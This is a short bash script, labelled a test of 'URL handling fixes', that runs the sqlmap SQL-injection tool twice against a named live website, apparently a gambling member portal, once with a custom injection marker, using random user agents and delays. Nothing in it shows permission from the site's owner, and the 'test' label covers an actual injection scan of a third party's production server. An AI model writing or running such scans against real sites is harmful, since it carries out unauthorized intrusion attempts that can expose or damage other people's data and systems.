#!/bin/bash

# Test script to verify URL handling fixes
# This script tests the basic sqlmap command to ensure it works

TARGET_URL="https://member.panama8888b.com/public/js/v2/app.js?v=25.1"
OUTPUT_DIR="./test_results"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}[+] Testing URL handling fixes${NC}"
echo -e "${GREEN}[+] Target: $TARGET_URL${NC}"
echo "=================================================="

# Create test directory
mkdir -p "$OUTPUT_DIR"

# Test 1: Basic sqlmap command with fixed URL handling
echo -e "${YELLOW}[*] Test 1: Basic sqlmap command${NC}"
echo "Testing: sqlmap -u $TARGET_URL --batch --level=1 --risk=1"

# Run a quick test
timeout 60 sqlmap -u "$TARGET_URL" \
    --batch \
    --level=1 \
    --risk=1 \
    --random-agent \
    --delay=1 \
    --timeout=10 \
    --output-dir="$OUTPUT_DIR/test1"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Test 1 completed successfully${NC}"
else
    echo -e "${RED}[!] Test 1 failed${NC}"
fi

echo "----------------------------------------"

# Test 2: Check if log file was created
echo -e "${YELLOW}[*] Test 2: Checking log file${NC}"
if [ -f "$OUTPUT_DIR/test1/log" ]; then
    echo -e "${GREEN}[+] Log file created successfully${NC}"
    echo "Log file size: $(wc -l < "$OUTPUT_DIR/test1/log") lines"
    
    # Check for any errors
    if grep -q "CRITICAL.*invalid target URL" "$OUTPUT_DIR/test1/log"; then
        echo -e "${RED}[!] URL handling issue still exists${NC}"
    else
        echo -e "${GREEN}[+] URL handling working correctly${NC}"
    fi
else
    echo -e "${RED}[!] Log file not found${NC}"
fi

echo "----------------------------------------"

# Test 3: Test with custom injection marker
echo -e "${YELLOW}[*] Test 3: Custom injection marker${NC}"
echo "Testing: sqlmap -u https://member.panama8888b.com/public/js/v2/app.js?v=25.1* --batch"

timeout 60 sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1*" \
    --batch \
    --level=1 \
    --risk=1 \
    --random-agent \
    --delay=1 \
    --output-dir="$OUTPUT_DIR/test2"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Test 3 completed successfully${NC}"
else
    echo -e "${RED}[!] Test 3 failed${NC}"
fi

echo "=================================================="
echo -e "${GREEN}[+] URL handling test completed!${NC}"
echo -e "${GREEN}[+] Check results in: $OUTPUT_DIR${NC}"